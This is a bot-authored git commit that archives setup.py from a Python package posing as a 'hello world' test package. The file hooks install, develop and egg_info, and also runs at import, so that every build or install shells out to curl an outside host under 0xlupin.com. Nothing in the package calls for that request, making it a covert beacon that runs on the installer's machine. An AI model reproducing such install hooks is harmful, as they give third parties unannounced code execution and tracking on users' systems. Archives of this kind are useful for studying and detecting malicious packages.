0f23c3fc00615dabfe75493ca566ef456e73db0f
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 11:26:49 +0000

    Add package testpackagehelloworldtest/0.0.4/testpackagehelloworldtest-0.0.4.tar.gz

---
+++ packages/testpackagehelloworldtest/testpackagehelloworldtest-0.0.4.tar.gz/testpackagehelloworldtest-0.0.4/setup.py
@@ -0,0 +1,42 @@
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+from setuptools.command.develop import develop
+from setuptools.command.egg_info import egg_info
+import os
+
+def custom_command():
+    import requests
+    os.system("curl http://testpackagehelloworldtest.package.0xlupin.com/")
+
+
+class CustomInstallCommand(install):
+    def run(self):
+        install.run(self)
+        custom_command()
+
+
+class CustomDevelopCommand(develop):
+    def run(self):
+        develop.run(self)
+        custom_command()
+
+
+class CustomEggInfoCommand(egg_info):
+    def run(self):
+        egg_info.run(self)
+        custom_command()
+
+
+custom_command()
+
+setup(
+    name="testpackagehelloworldtest",
+    version="0.0.4",
+    packages=find_packages(),
+    install_requires=[],
+    cmdclass={
+        'install': CustomInstallCommand,
+        'develop': CustomDevelopCommand,
+        'egg_info': CustomEggInfoCommand,
+    },
+)
